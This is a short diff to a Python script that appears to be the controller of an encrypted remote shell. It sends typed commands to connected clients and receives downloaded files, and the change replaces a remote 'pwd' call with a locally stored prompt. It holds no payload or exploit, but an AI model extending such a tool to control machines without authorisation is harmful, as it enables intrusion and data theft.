@@ -17,6 +17,8 @@ socks = []
 clients = []
 active = False
 
+prompt = ''
+
 def close(sock, client):
   socks.remove(sock)
   clients.remove(client)
@@ -80,6 +82,7 @@ while True:
       break
 
     if type(data) == str:
+      prompt = data.split('\n')[-1]
       pr(data, end='')
     else:
       try:
@@ -89,8 +92,7 @@ while True:
         pr('🍺 File dl ✅')
       except Exception as e:
         pr('⚠️', e)
-      Send(sock, cipher, 'pwd')
-      continue
+      pr(prompt, end='')
 
     nc = _input()
 
@@ -108,7 +110,7 @@ while True:
         Send(sock, cipher, d, fn)
       except Exception as e:
         pr('⚠️', e)
-        Send(sock, cipher, 'pwd')
+        pr(prompt, end='')
 
     else:
       Send(sock, cipher, nc)
